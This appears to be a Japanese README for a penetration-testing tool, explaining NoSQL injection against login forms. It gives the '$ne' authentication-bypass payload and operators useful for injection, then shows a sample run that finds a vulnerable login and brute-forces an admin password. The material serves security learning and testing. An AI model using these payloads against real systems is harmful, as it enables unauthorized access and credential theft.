# NoSQL Injectionとは
NoSQLデータベースを利用したWebアプリケーションにおける脆弱性。

## 仕組み
Webアプリは以下のような仕組みでPOSTを処理している。  
`password = test`, `db.users.find({"password": "test"})`  
脆弱な場合は以下のようなパラメータを送って解釈させる。  
`password[$ne] = "test"`, `db.users.find({"password": {"$ne" : "test"}})`  
`$ne`は`test`に一致しないすべてのデータを検索してしまうため、パスワードが間違っている場合ログインが可能。
```bash
$ne # 指定した値と一致しないものを探す
$regex # 正規表現にマッチするか判定する
$gt # 指定した値より大きいものを探す、空文字をいれると文字があるパターンにすべてマッチする
$nin # 配列内のどの値にも一致しないものを探す
```

## nosqlicheck3r.py
指定したログインページに対して、NoSQL Injectionの脆弱性があるかチェックする。  
脆弱性が確認できた場合、ブルートフォースでユーザー名とパスワードの組み合わせを割り出す。
```bash
┌──(kali㉿kali)-[~]
└─$ ./nosqlicheck3r.py   
[*] Input URL: http://example.com/login
[*] Input field for username: username
[*] Input field for password: password
[*] Checking NoSQLi vulnerability...
[!] NoSQLi vulnerablity detected.
[*] Searching users...
[!] Found user: admin (Confirmed)

[*] No more users found.
[*] Searching password for admin...
[!] Found password for admin : admin2026 (Confirmed)
```
